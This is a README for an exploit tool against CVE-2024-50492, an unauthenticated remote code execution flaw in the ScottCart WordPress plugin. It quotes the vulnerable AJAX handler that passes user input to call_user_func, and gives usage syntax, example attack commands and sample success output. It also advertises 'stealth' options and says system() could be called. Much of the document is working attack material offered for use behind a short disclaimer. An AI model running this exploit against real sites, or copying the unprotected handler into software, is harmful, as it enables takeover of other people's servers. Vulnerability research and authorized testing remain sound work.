
# 🚨 CVE-2024-50492 - ScottCart <= 1.1 RCE Exploit

> 🔥 Exploit Script for ScottCart <= 1.1 - Unauthenticated Remote Code Execution  
> 🧑‍💻 By Nxploit – *Khaled Alenazi*

---

## 📌 Description

The **ScottCart** plugin for WordPress (versions ≤ 1.1) is vulnerable to **Remote Code Execution (RCE)**.  
This allows **unauthenticated attackers** to execute arbitrary PHP functions on the server through a vulnerable AJAX endpoint.

- **Plugin**: ScottCart ≤ 1.1  
- **Vulnerability**: Unauthenticated Function Injection → RCE  
- **CVE**: CVE-2024-50492  
- **CVSS Score**: **9.8 - Critical**

---

## 🧠 How it works

The plugin registers an unprotected AJAX action:
```php
add_action('wp_ajax_nopriv_scottcart_load_function', 'scottcart_load_function_callback');
```

Which executes:
```php
call_user_func($_POST['function']);
```

Allowing attackers to call **any existing PHP function**, like:
- `phpinfo()`
- `scottcart_get_the_user_ip()`
- `system()` ← if extended in modified environments

---

## 🚀 Exploit Features

- ✅ Automatically sends crafted payload to trigger the vulnerable endpoint
- ✅ Allows function override via argument
- ✅ Default payload: `phpinfo()` for PoC
- ✅ Saves output to timestamped file (e.g., `results_2025-03-26_14-33-01.txt`)
- ✅ Custom `User-Agent`, error handling, and SSL ignore for stealth

---

## 🖥️ Usage

```bash
usage: CVE-2024-50492.py [-h] -u URL [-p PAYLOAD]

ScottCart <= 1.1 - Unauthenticated Remote Code Execution
By Nxploit Khaled Alenazi.

options:
  -h, --help            Show this help message and exit
  -u URL, --url URL     Target base URL (e.g., http://192.168.100.74:888/wordpress)
  -p PAYLOAD, --payload PAYLOAD
                        Function to call (default: phpinfo)
```

---

## 💡 Examples

### 🔍 Default behavior (PoC with `phpinfo()`):
```bash
python3 CVE-2024-50492.py -u http://192.168.100.74:888/wordpress
```

### 🔎 Call internal plugin function:
```bash
python3 CVE-2024-50492.py -u http://192.168.100.74:888/wordpress -p scottcart_get_the_user_ip
```

---

## 🧾 Output Example

```
[+] Target URL: http://192.168.100.74:888/wordpress
[+] Payload Function: phpinfo
[*] Launching exploit...
[+] Sending payload: function=phpinfo
[+] Exploit successful! Output:

PHP Version => 8.1.12
...
```

📁 And saved in: `results_2025-03-26_14-33-01.txt`

---

## 🛡️ Disclaimer

This tool is for **educational and authorized testing** purposes only.  
Do **not** use against systems you do not own or have explicit permission to test.

---

## 💬 Credits

- 💻 Exploit by: [Nxploit – Khaled Alenazi](https://github.com/Nxploited)
- 🛡️ CVE ID: CVE-2024-50492
